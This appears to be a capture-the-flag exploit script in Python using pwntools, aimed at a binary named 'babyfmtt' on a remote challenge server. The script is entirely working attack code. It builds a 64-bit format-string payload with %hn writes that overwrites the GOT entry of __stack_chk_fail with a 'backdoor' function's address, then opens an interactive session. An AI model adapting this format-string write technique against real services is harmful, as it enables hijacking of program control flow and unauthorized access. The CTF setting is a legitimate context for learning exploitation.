from pwn import *
context.log_level = "debug"
# p = process("./babyfmtt")
p = remote("118.24.3.214" , 11001)
elf = ELF("./babyfmtt")

def fmt(prev , target):
	if prev < target:
		result = target - prev
		return "%" + str(result)  + "c"
	elif prev == target:
		return ""
	else:
		result = 0x10000 + target - prev
		return "%" + str(result) + "c"

def fmt64(offset , target_addr , target_value , prev = 0):
	payload = ""
	for i in range(3):
		payload += p64(target_addr + i * 2)
	payload2 = ""
	for i in range(3):
		target = (target_value >> (i * 16)) & 0xffff 
		payload2 += fmt(prev , target) + "%" + str(offset + 8 + i) + "$hn"
		prev = target
	payload = payload2.ljust(0x40 , "a") + payload
	return payload
p.sendafter("It's easy to PWN\n" , fmt64(6 , elf.got["__stack_chk_fail"] , elf.sym["backdoor"]) + "a")
p.interactive()